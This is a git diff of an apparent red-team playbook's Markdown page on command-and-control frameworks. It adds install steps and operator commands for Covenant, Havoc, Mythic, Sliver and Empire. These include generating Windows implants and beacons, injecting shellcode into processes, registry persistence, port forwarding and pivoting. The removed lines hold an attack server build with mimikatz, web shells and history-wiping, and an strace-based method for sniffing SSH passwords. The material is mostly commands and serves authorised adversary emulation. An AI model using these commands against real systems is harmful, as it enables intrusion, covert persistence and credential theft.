@@ -3,515 +3,77 @@
 ## Table of Contents
 
 - [Tooling](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#Tooling)
-- [C2 Installation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#C2-Installation)
-- [Empire](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#Empire)
-- [Sniffing SSH Passwords](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#Sniffing-SSH-Passwords)
+- [Covenant](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#Covenant)
+- [Hak5 Cloud C2](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#Hak5-Cloud-C2)
+- [Havoc](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#Havoc)
+- [Mythic](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#Mythic)
+- [Sliver](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#Sliver)
 
 ## Tooling
 
 | Name | Description | URL |
 | --- | --- | --- |
-| Hardhat C2 | A c# Command & Control framework | https://github.com/DragoQCC/HardHatC2 |
+| Cobalt Strike | Adversary Simulation and Red Team Operations | https://www.cobaltstrike.com/ |
+| Covenant | Covenant is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform for red teamers. | https://github.com/cobbr/Covenant |
+| DeathStar | DeathStar is a Python script that uses Empire's RESTful API to automate gaining Domain and/or Enterprise Admin rights in Active Directory environments using some of the most common offensive TTPs. | https://github.com/byt3bl33d3r/DeathStar |
+| Empire | Empire 4 is a post-exploitation framework that includes a pure-PowerShell Windows agents, Python 3.x Linux/OS X agents, and C# agents. | https://github.com/BC-SECURITY/Empire |
 | Havoc | The Havoc Framework | https://github.com/HavocFramework/Havoc |
 | Mythic | A cross-platform, post-exploit, red teaming framework built with python3, docker, docker-compose, and a web browser UI. It's designed to provide a collaborative and user friendly interface for operators, managers, and reporting throughout red teaming. | https://github.com/its-a-feature/Mythic |
+| RedWarden | Cobalt Strike C2 Reverse proxy that fends off Blue Teams, AVs, EDRs, scanners through packet inspection and malleable profile correlation | https://github.com/mgeeky/RedWarden |
 | Sliver | Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. | https://github.com/BishopFox/sliver |
-| Covenant | Covenant is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform for red teamers. | https://github.com/cobbr/Covenant |
-| Empire | Empire 4 is a post-exploitation framework that includes a pure-PowerShell Windows agents, Python 3.x Linux/OS X agents, and C# agents. | https://github.com/BC-SECURITY/Empire |
-| DeathStar | DeathStar is a Python script that uses Empire's RESTful API to automate gaining Domain and/or Enterprise Admin rights in Active Directory environments using some of the most common offensive TTPs. | https://github.com/byt3bl33d3r/DeathStar |
 
-## C2 Installation
+## Covenant
 
-Ansible playbook for this setup is planned but not yet started.
+> https://github.com/cobbr/Covenant
 
-### Set Timezone
+> https://github.com/cobbr/Covenant/wiki/Installation-And-Startup
 
-```c
-root@c2:~# timedatectl set-timezone <COUNTRY>/<CITY>
-```
-
-### Update Server OS
+### Prerequisites
 
 ```c
-root@c2:~# apt-get update && apt-get upgrade && apt-get dist-upgrade && apt-get autoremove && apt-get autoclean
+$ sudo apt-get install docker docker-compose
 ```
 
-### Packages
+### Installation
 
 ```c
-root@c2:~# apt-get install apt-transport-https curl fail2ban fuse gdb git golang iptables-persistent maven netcat nmap p7zip-full proxychains psad python3-tk ruby ruby-dev snap snapd software-properties-common tmux tor vim
+$ git clone --recurse-submodules https://github.com/cobbr/Covenant
+$ cd Covenant/Covenant
+$ docker build -t covenant .
 ```
-
-### User Configuration
 
 ```c
-root@c2:~# useradd -m c2ops
-root@c2:~# passwd c2ops
-root@c2:~# usermod -aG sudo c2ops
-root@c2:~# usermod -s /bin/bash c2ops
-root@c2:~# ln /dev/null ~/.bash_history -sf
-c2ops@c2:~$ ln /dev/null ~/.bash_history -sf
+$ docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant
 ```
 
-### SSH
+> https://127.0.0.1:7443/covenantuser/login
 
-* Copy authorized_keys to the .ssh folder in the home directory of root and c2ops
-* Change the permission of the authorized_keys file
-* Copy sshd_config to /etc/ssh/
+### Stop Covenant
 
 ```c
-root@c2:~# chmod 644 /home/c2ops/.ssh/authorized_keys
-root@c2:~# chown root /home/c2ops/.ssh/authorized_keys
+$ docker stop covenant
 ```
 
-### fail2ban
-
-* Copy fail2ban.conf to /etc/fail2ban/
-* Copy jail.local to /etc/fail2ban/
-* Copy nginx-badbots.conf to /etc/fail2ban/filter.d/
-* Copy nginx-noscript.conf /etc/fail2ban/filter.d/
-
-### psad
-
-* copy psad.conf to /etc/psad/ if you already have one
-
-### iptables
-
-* Create iptables.sh in /root/.scripts/
+### Restart Covenant
 
 ```c
-root@c2:~/.scripts# cat iptables.sh
-#!/bin/bash
-
-/sbin/iptables -F
-/sbin/iptables -P INPUT DROP
-/sbin/iptables -P OUTPUT ACCEPT
-/sbin/iptables -I INPUT -i lo -j ACCEPT
-/sbin/iptables -A INPUT -p tcp --match multiport --dports 22 -j ACCEPT
-/sbin/iptables -A INPUT -p tcp --match multiport --dports 80 -j ACCEPT
-/sbin/iptables -A INPUT -p tcp --match multiport --dports 443 -j ACCEPT
-/sbin/iptables -A INPUT -p tcp --match multiport --dports 53 -j ACCEPT
-/sbin/iptables -A INPUT -p udp --match multiport --dports 53 -j ACCEPT
-/sbin/iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT
-/sbin/iptables -A INPUT -m conntrack --ctstate NEW,ESTABLISHED,RELATED -j ACCEPT
-/usr/sbin/netfilter-persistent save
-/usr/sbin/iptables-save > /root/custom-ip-tables-rules
-
-root@c2:~/.scripts# chmod +x iptables.sh
-root@c2:~/.scripts# ./iptables.sh
+$ docker start covenant -ai
 ```
 
-It is recommendet to only allow access from known `IP addresses`!
-
-### crontab
+### Remove and Restart Covenant
 
 ```c
-root@c2:~# crontab -e
-0 */12 * * * certbot renew --pre-hook "service nginx stop" --post-hook "service nginx start"
-```
-
-### Update fstab
-
-```c
-root@c2:~# cat /etc/fstab
-proc  /proc       proc    defaults,hidepid=2    0    0
-none  /dev/pts    devpts  rw,gid=5,mode=620    0    0
-none  /run/shm    tmpfs   defaults    0    0
-```
-
-### Services cleanup
-
-```c
-root@c2:~# systemctl disable apache2
-root@c2:~# systemctl disable exim4
-root@c2:~# apt-get purge exim4
-root@c2:~# apt-get purge apache2
-```
-
-### OOB DNS
-
-```c
-root@c2:~/opt/01_information_gathering# git clone https://github.com/JuxhinDB/OOB-Server
-root@c2:~/opt/01_information_gathering/OOB-Server# ./setup
-```
-
-### Nginx
-
-```c
-root@c2:~# add-apt-repository ppa:nginx/stable
-root@c2:~# apt-get install nginx
-```
-
-* Copy nginx.conf /etc/nginx/
-* Copy website to /etc/nginx/sites-available/
-* Set symlink ln -s /etc/nginx/sites-available/website /etc/nginx/sites-enabled/
-* Copy index.html to /var/www/html
-* Create files folder in /var/www/html
-* Download the following binaries:
-
-```c
-root@c2:/var/www/html/files# wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
-root@c2:/var/www/html/files# wget https://github.com/carlospolop/PEASS-ng/releases/download/20220515/linpeas.sh
-root@c2:/var/www/html/files# wget https://github.com/carlospolop/PEASS-ng/releases/download/20220515/winPEAS.bat
-root@c2:/var/www/html/files# wget https://github.com/carlospolop/PEASS-ng/releases/download/20220515/winPEASx64.exe
-root@c2:/var/www/html/files# wget https://github.com/carlospolop/PEASS-ng/releases/download/20220515/winPEASx86.exe
-root@c2:/var/www/html/files# wget https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip
-- Unzip netcat-win32-1.12.zip
-root@c2:/var/www/html/files# wget https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.bin
-root@c2:/var/www/html/files# wget https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.exe
-root@c2:/var/www/html/files# wget https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx86.bin
-root@c2:/var/www/html/files# wget https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx86.exe
-root@c2:/var/www/html/files# wget https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socat_macOS.bin
-root@c2:/var/www/html/files# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
-root@c2:/var/www/html/files# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
-root@c2:/var/www/html/files# wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
-root@c2:/var/www/html/files# wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
-root@c2:/var/www/html/files# wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.7z
-```
-
-* Unzip mimikatz_trunk.7z
-
-### Let's Encrypt
-
-Only necessary if the server got installed from a backup!
-
-```c
-root@c2:~# apt-get install letsencrypt
-```
-
-* Copy letsencrypt to /etc/
-* Set symlinks:
-
-```c
-root@c2:~# cd /etc/letsencrypt/live/example.com
-root@c2:/etc/letsencrypt/live/example.com# rm cert.pem chain.pem fullchain.pem privkey.pem
-root@c2:~$tc/letsencrypt/live/example.com# ln -s ../../archive/example.com/cert2.pem cert.pem
-root@c2:~$tc/letsencrypt/live/example.com# ln -s ../../archive/example.com/chain2.pem chain.pem
-root@c2:~$tc/letsencrypt/live/example.com# ln -s ../../archive/example.com/fullchain2.pem fullchain.pem
-root@c2:~$tc/letsencrypt/live/example.com# ln -s ../../archive/example.com/privkey2.pem privkey.pem
-```
-
-### Services
-
-```c
-root@c2:~# systemctl enable psad
-root@c2:~# systemctl enable fail2ban
-root@c2:~# systemctl enable bind9
-root@c2:~# systemctl enable nginx
-root@c2:~# systemctl start psad
-root@c2:~# systemctl start fail2ban
-root@c2:~# systemctl start bind9
-root@c2:~# systemctl start nginx
-root@c2:~# systemctl restart sshd
-root@c2:~# systemctl reboot
-```
-
-### tmux tpm
-
-```c
-c2ops@c2:~$ git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm
-```
-
-#### .tmux.conf
-
-```c
-set -g default-terminal screen-256color
-set -g history-limit 10000
-set -g base-index 1
-set -g mouse on
-set -g terminal-overrides "xterm*:XT:smcup@:rmcup@:"
-set -g renumber-windows on
-set -g set-clipboard on
-set -g status-interval 3
-set -sg escape-time 0
-setw -g mode-keys vi
-set-option -g allow-rename off
-set-window-option -g automatic-rename off
-set -g @plugin 'tmux-plugins/tpm'
-set -g @plugin 'tmux-plugins/tmux-sensible'
-set -g @plugin 'tmux-plugins/tmux-resurrect'
-run '~/.tmux/plugins/tpm/tpm'
-run-shell ~/clone/path/resurrect.tmux
-```
-
-### Metasploit
-
-```c
-c2ops@c2:~/opt/frameworks/Metasploit$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
-  chmod 755 msfinstall && \
-  ./msfinstall
-c2ops@c2:~/opt/frameworks$ msfconsole
-```
-
-### Empire & Death Star
-
-```c
-c2ops@c2:~/opt/frameworks$ git clone --recursive https://github.com/BC-SECURITY/Empire.git
-c2ops@c2:~/opt/frameworks/Empire$ sudo ./setup/install.sh
-```
-
-* Install all stagers
-
-```c
-c2ops@c2:~$ python3 -m pip install --user pipx
-c2ops@c2:~$ sudo apt-get install python3.8-venv
-c2ops@c2:~$ .local/bin/pipx install deathstar-empire
-```
-
-### Swaks
-
-```c
-c2ops@c2:~/opt/basics/swaks$ curl -O https://jetmore.org/john/code/swaks/files/swaks-20201014.0/swaks
-c2ops@c2:~/opt/basics/swaks$ chmod +x swaks
-```
-
-### Amass
-
-```c
-c2ops@c2:~$ sudo snap install amass
-```
-
-### Subfinder
-
-```c
-c2ops@c2:~/opt/01_information_gathering/subfinder$ wget https://github.com/projectdiscovery/subfinder/releases/download/v2.5.1/subfinder_2.5.1_linux_amd64.zip
-c2ops@c2:~/opt/01_information_gathering/subfinder$ unzip subfinder_2.5.1_linux_amd64.zip
-```
-
-### naabu
-
-```c
-c2ops@c2:~/opt/01_information_gathering/naabu$ wget https://github.com/projectdiscovery/naabu/releases/download/v2.0.7/naabu_2.0.7_linux_amd64.zip
-c2ops@c2:~/opt/01_information_gathering/naabu$ unzip naabu_2.0.7_linux_amd64.zip
-```
-
-### enum4linux-ng
-
-```c
-c2ops@c2:~/opt/01_information_gathering$ git clone https://github.com/cddmp/enum4linux-ng.git
-```
-
-### Nuclei
-
-```c
-c2ops@c2:~/opt/02_vulnerability_analysis/nuclei$ wget https://github.com/projectdiscovery/nuclei/releases/download/v2.7.0/nuclei_2.7.0_linux_amd64.zip
-c2ops@c2:~/opt/02_vulnerability_analysis/nuclei$ unzip nuclei_2.7.0_linux_amd64.zip
-```
-
-### Nuclei-Templates
-
-```c
-c2ops@c2:~/opt/02_vulnerability_analysis$ git clone https://github.com/projectdiscovery/nuclei-templates.git
-```
-
-### Dalfox
-
-```c
-c2ops@c2:~$ sudo snap install dalfox
-```
-
-### Shodan
-
-```c
-c2ops@c2:~$ pip3 install shodan
-c2ops@c2:~$ shodan init <API_KEY>
-```
-
-### Gobuster
-
-```c
-c2ops@c2:~/opt/03_web_application_analysis/gobuster$ wget https://github.com/OJ/gobuster/releases/download/v3.1.0/gobuster-linux-amd64.7z
-c2ops@c2:~/opt/03_web_application_analysis/gobuster$ 7z e gobuster-linux-amd64.7z
-c2ops@c2:~/opt/03_web_application_analysis/gobuster$ chmod +x gobuster
-```
-
-### ffuf
-
-```c
-c2ops@c2:~/opt/03_web_application_analysis$ git clone https://github.com/ffuf/ffuf ; cd ffuf ; go get ; go build
-```
-
-### TruffleHog
-
-```c
-c2ops@c2:~/opt/03_web_application_analysis$ git clone https://github.com/trufflesecurity/trufflehog.git
-c2ops@c2:~/opt/03_web_application_analysis/trufflehog$ go install
-```
-
-### WPScan
-
-```c
-root@c2:/home/c2ops# gem install wpscan
-```
-
-### CrackMapExec
-
-```c
-c2ops@c2:~$ pipx install crackmapexec
-```
-
-### John
-
-```c
-root@c2:/home/c2ops# apt-get install g++ git qtbase5-dev
-c2ops@c2:~/opt/05_password_attacks$ git clone https://github.com/shinnok/johnny.git && cd johnny
-c2ops@c2:~/opt/05_password_attacks/johnny$ git checkout v2.2
-c2ops@c2:~/opt/05_password_attacks/johnny$ export QT_SELECT=qt5
-c2ops@c2:~/opt/05_password_attacks/johnny$ qmake && make -j$(nproc)
-```
-
-### hashcat
-
-```c
-c2ops@c2:~/opt/05_password_attacks/hashcat$ wget https://hashcat.net/files/hashcat-6.2.5.7z
-c2ops@c2:~/opt/05_password_attacks/hashcat$ 7z e hashcat-6.2.5.7z
-```
-
-### sqlmap
-
-```c
-c2ops@c2:~/opt/04_database_assessment$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
-c2ops@c2:~/opt/04_database_assessment/sqlmap$ python3 sqlmap.py
-```
-
-### peda
-
-```c
-c2ops@c2:~$ git clone https://github.com/longld/peda.git ~/peda
-c2ops@c2:~$ echo "source ~/peda/peda.py" >> ~/.gdbinit
-```
-
-### lsassy
-
-```c
-c2ops@c2:~$ python3 -m pip install lsassy
-```
-
-### JNDI-Exploit-Kit
-
-```c
-c2ops@c2:~/opt/08_exploitation_tools$ git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
-c2ops@c2:~/opt/08_exploitation_tools/JNDI-Injection-Exploit$ mvn clean package -DskipTests
-```
-
-### Ghostpack-CompiledBinaries
-
-```c
-c2ops@c2:~/opt/08_exploitation_tools$ git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
-```
-
-### Impacket
-
-```c
-c2ops@c2:~/opt/08_exploitation_tools$ git clone https://github.com/SecureAuthCorp/impacket.git
-c2ops@c2:~/opt/08_exploitation_tools/impacket$ python3 -m pip install .
-```
-
-### Evil-WinRM
-
-```c
-root@c2:/home/c2ops# gem install evil-winrm
-```
-
-### GoPhish
-
-```c
-c2ops@c2:~/opt/13_social_engineering_tools/gophish$ wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip
-c2ops@c2:~/opt/13_social_engineering_tools/gophish$ unzip gophish-v0.11.0-linux-64bit.zip
-c2ops@c2:~/opt/13_social_engineering_tools/gophish$ chmod +x gophish
-c2ops@c2:~/opt/13_social_engineering_tools/gophish$ sudo ./gophish
-```
-
-#### Access
-
-```
-$ ssh -i ~/.ssh/id_rsa c2ops@<RHOST> -L 3333:localhost:3333 -N -f
-```
-
-> https://localhost:3333/login?next=%2F
-
-### theHarvester
-
-```c
-c2ops@c2:~/opt/osint$ git clone https://github.com/laramies/theHarvester
-c2ops@c2:~/opt/osint/theHarvester$ python3 -m pip install -r requirements/dev.txt
-```
-
-### PowerShell
-
-```c
-c2ops@c2:~/opt/05_password_attacks/hashcat$ sudo snap install powershell --classic
-```
-
-### nishang
-
-```c
-c2ops@c2:~/opt/payloads$ git clone https://github.com/samratashok/nishang.git
-```
-
-### PowerSharpPack
-
-```c
-c2ops@c2:~/opt/payloads$ git clone https://github.com/S3cur3Th1sSh1t/PowerSharpPack.git
-```
-
-### phpgcc
-
-```c
-c2ops@c2:~/opt/payloads$ git clone https://github.com/ambionics/phpggc.git
-```
-
-### Shikata Ga Nai
-
-```c
-c2ops@c2:~/opt/payloads$ git clone https://github.com/EgeBalci/sgn.git
-```
-
-### ysoserial
-
-```c
-c2ops@c2:~/opt/payloads$ git clone https://github.com/frohoff/ysoserial.git
-```
-
-### marshallsec
-
-```c
-c2ops@c2:~/opt/payloads$ git clone https://github.com/mbechler/marshalsec.git
-```
-
-### YSoSerial.Net
-
-```c
-c2ops@c2:~/opt/payloads$ git clone https://github.com/pwntester/ysoserial.net.git
-```
-
-### Unicorn
-
-```c
-c2ops@c2:~/opt/payloads$ git clone https://github.com/trustedsec/unicorn.git
-```
-
-### Web-Shells
-
-```c
-c2ops@c2:~/opt/payloads$ git clone https://github.com/TheBinitGhimire/Web-Shells.git
-```
-
-### rockyou.txt
-
-```c
-c2ops@c2:~/opt/wordlists/rockyou$ wget https://gitlab.com/kalilinux/packages/wordlists/-/raw/kali/master/rockyou.txt.gz
-c2ops@c2:~/opt/wordlists/rockyou$ gunzip rockyou.txt.gz
-```
-
-### SecLists
-
-```c
-c2ops@c2:~/opt/wordlists$ git clone https://github.com/danielmiessler/SecLists.git
+$ ~/Covenant/Covenant > docker rm covenant
+$ ~/Covenant/Covenant > docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant --username AdminUser --computername 0.0.0.0
 ```
 
 ## Empire
 
-### Basic Commands
+> https://github.com/BC-SECURITY/Empire
+
+> https://hackmag.com/security/powershell-empire/
+
+### Common Commands
 
 ```c
 (Empire) > listeners                      // list current running listeners
@@ -563,7 +125,7 @@ c2ops@c2:~/opt/wordlists$ git clone https://github.com/danielmiessler/SecLists.g
 (Empire: listeners/http) > info
 (Empire: listeners/http) > set Name <NAME>
 (Empire: listeners/http) > set Host <LHOST>
-(Empire: listeners/http) > set Port <Port>
+(Empire: listeners/http) > set Port <PORT>
 (Empire: listeners/http) > exeute
 ```
 
@@ -584,12 +146,283 @@ c2ops@c2:~/opt/wordlists$ git clone https://github.com/danielmiessler/SecLists.g
 (Empire: <NAME>/powershell/persistence/elevated/registry) > run
 ```
 
-## Sniffing SSH Passwords
+## Hak5 Cloud C2
 
 ```c
-$ pgrep -l sshd
-6235 sshd
-$ strace -f -p 6235 -e trace=write -o capture
+$ ./c2-3.3.0_amd64_linux -hostname 127.0.0.1 -listenip 127.0.0.1
+```
+
+> http://127.0.0.1:8080
+
+## Havoc
+
+> https://github.com/HavocFramework/Havoc
+
+### Python Environment
+
+```c
+$ sudo apt-get install build-essential
+$ sudo add-apt-repository ppa:deadsnakes/ppa
+$ sudo apt-get update
+$ sudo apt-get install python3.10 python3.10-dev
+```
+
+### Prerequisites
+
+```c
+$ sudo apt-get install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev libspdlog-dev python3-dev libboost-all-dev mingw-w64 nasm
+```
+
+### Installation
+
+#### Building Client
+
+```c
+user@host:/opt$ sudo git clone https://github.com/HavocFramework/Havoc.git
+user@host:/opt$ cd Havoc/Client
+user@host:/opt/Havoc/Client$ make 
+user@host:/opt/Havoc/Client$ ./Havoc
+```
+
+#### Building Teamserver
+
+```c
+user@host:/opt/Havoc/Teamserver$ go mod download golang.org/x/sys
+user@host:/opt/Havoc/Teamserver$ go mod download github.com/ugorji/go
+user@host:/opt/Havoc/Teamserver$ ./Install.sh
+user@host:/opt/Havoc/Teamserver$ make
+user@host:/opt/Havoc/Teamserver$ ./teamserver -h
+user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
+```
+
+### Start Teamserver
+
+```c
+user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
+```
+
+### Start Client
+
+```c
+user@host:/opt/Havoc/Client$ ./Havoc
+```
+
+## Mythic
+
+> https://github.com/its-a-feature/Mythic
+
+> https://docs.mythic-c2.net/
+
+> https://github.com/MythicAgents
+
+> https://github.com/MythicC2Profiles
+
+### Installation
+
+```c
+$ git clone https://github.com/its-a-feature/Mythic
+$ cd Mythic
+$ sudo ./install_docker_ubuntu.sh
+$ sudo make
+```
+
+### Install Apollo
+
+```c
+$ sudo -E ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
+```
+
+### Install HTTP C2 Profile
+
+```c
+$ sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
+```
+
+### Finalize the Installation
+
+```c
+$ sudo ./mythic-cli start
+$ cat .env
+```
+
+> https://127.0.0.1:7443
+
+## Sliver
+
+> https://github.com/BishopFox/sliver
+
+> https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2
+
+> https://github.com/BishopFox/sliver/wiki/Beginner's-Guide
+
+> https://github.com/BishopFox/sliver/wiki/Getting-Started
+
+### Installation
+
+```c
+$ curl https://sliver.sh/install | sudo bash
+```
+
+### Quick Start
+
+Download the latest `sliver-server` binary and execute it.
+
+> https://github.com/BishopFox/sliver/releases
+
+```c
+$ ./sliver-server_linux 
+
+Sliver  Copyright (C) 2022  Bishop Fox
+This program comes with ABSOLUTELY NO WARRANTY; for details type 'licenses'.
+This is free software, and you are welcome to redistribute it
+under certain conditions; type 'licenses' for details.
+
+Unpacking assets ...
+[*] Loaded 20 aliases from disk
+[*] Loaded 104 extension(s) from disk
+
+    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
+    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
+    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
+    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
+    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
+    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
+
+All hackers gain evolve
+[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
+[*] Welcome to the sliver shell, please type 'help' for options
+```
+
+```c
+[server] sliver > multiplayer
+
+[*] Multiplayer mode enabled!
+```
+
+```c
+[server] sliver > generate --http <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/FOLDER/
+```
+
+```c
+[server] sliver > http
+```
+
+### Administration
+
+```c
+sliver > version
+sliver > players
+sliver > armory
+sliver > armory install all
+```
+
+### Multiplayer
+
+#### Register a new Operator
+
+```c
+[server] sliver > multiplayer
+[server] sliver > new-operator --name <USERNAME> --lhost <LHOST>
+```
+
+#### Access with Custom Configuration File
+
+```c
+$ ./sliver-client import ./<USERNAME>_example.com.cfg
+```
+
+#### Kick Operator
+
+```c
+[server] sliver > kick-operator -n <USERNAME>
+```
+
+### Implant and Beacon Creation 
+
+```
+sliver > help generate
+sliver > generate --mtls <LHOST> --os windows --save /PATH/TO/BINARY
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
+sliver > generate --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
+sliver > generate beacon --mtls <LHOST> --os windows --save /PATH/TO/BINARY
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
+sliver > generate beacon --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
+```
+
+### Profile Handling
+
+```c
+sliver (STALE_PNEUMONIA) > profiles new --mtls <LHOST> --os windows --arch amd64 --format exe session_win_default
+sliver (STALE_PNEUMONIA) > profiles generate --save /PATH/TO/BINARY session_win_default
+sliver > profiles new beacon --mtls <LHOST> --os windows --arch amd64 --format exe  --seconds 5 --jitter 3 beacon_win_default
+sliver > profiles generate --save /PATH/TO/BINARY beacon_win_default
+```
+
+### Common Commands, Implant and Beacon Handling
+
+```c
+sliver > mtls                                                             // Mutual Transport Layer Security
+sliver > mtls --lport <LPORT>                                             // Set MTLS port
+sliver > jobs                                                             // display current jobs
+sliver > implants                                                         // show all created implants
+sliver > sessions                                                         // display currently available sessions
+sliver > sessions -i <ID>                                                 // interact with a session
+sliver > use -i <ID>                                                      // interact with a session
+sliver > sessions -k <ID>                                                 // kill a session
+sliver > upload //PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY     // upload a file
+sliver > download /PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY    // download a file
+sliver (NEARBY_LANGUAGE) > tasks                                          // show tasks
+sliver (NEARBY_LANGUAGE) > tasks fetch 49ead4a9                           // fetch a specific task
+sliver (NEARBY_LANGUAGE) > info                                           // provide session information
+sliver (NEARBY_LANGUAGE) > shell                                          // spawn a shell (ctrl + d to get back)
+sliver (NEARBY_LANGUAGE) > netstat                                        // get network information
+sliver (NEARBY_LANGUAGE) > interactive                                    // interact with a session
+sliver (NEARBY_LANGUAGE) > screenshot                                     // create a screenshot
+sliver (NEARBY_LANGUAGE) > background                                     // background the session
+sliver (NEARBY_LANGUAGE) > execute-assembly <FILE>.exe uac                // execute a local binary
+sliver (NEARBY_LANGUAGE) > execute-shellcode <FILE>.bin uac               // execute a local binary
+```
+
+### Spawning new Sessions
+
+```c
+sliver (NEARBY_LANGUAGE) > interactive
+sliver (NEARBY_LANGUAGE) > generate --format shellcode --http acme.com --save /PATH/TO/BINARY
+sliver (NEARBY_LANGUAGE) > execute-shellcode -p <PID> /PATH/TO/BINARY/<FILE>.bin
+```
+
+### Port Forwarding
+
+```c
+sliver (NEARBY_LANGUAGE) > portfwd
+sliver (NEARBY_LANGUAGE) > portfwd add -r <RHOST>:<RPORT>
+sliver (NEARBY_LANGUAGE) > portfwd add --bind 127.0.0.1:<RPORT> -r <RHOST>:<RPORT>
+sliver (NEARBY_LANGUAGE) > portfwd rm -i <ID>
+```
+
+### SOCKS Proxy
+
+```c
+sliver (NEARBY_LANGUAGE) > socks5 start
+sliver (NEARBY_LANGUAGE) > socks5 stop -i 1
+```
+
+### Pivoting
+
+```c
+sliver (NEARBY_LANGUAGE) > pivots tcp
+sliver (NEARBY_LANGUAGE) > generate --tcp-pivot <RHOST>:9898
+sliver (NEARBY_LANGUAGE) > pivots
 ```
 
 
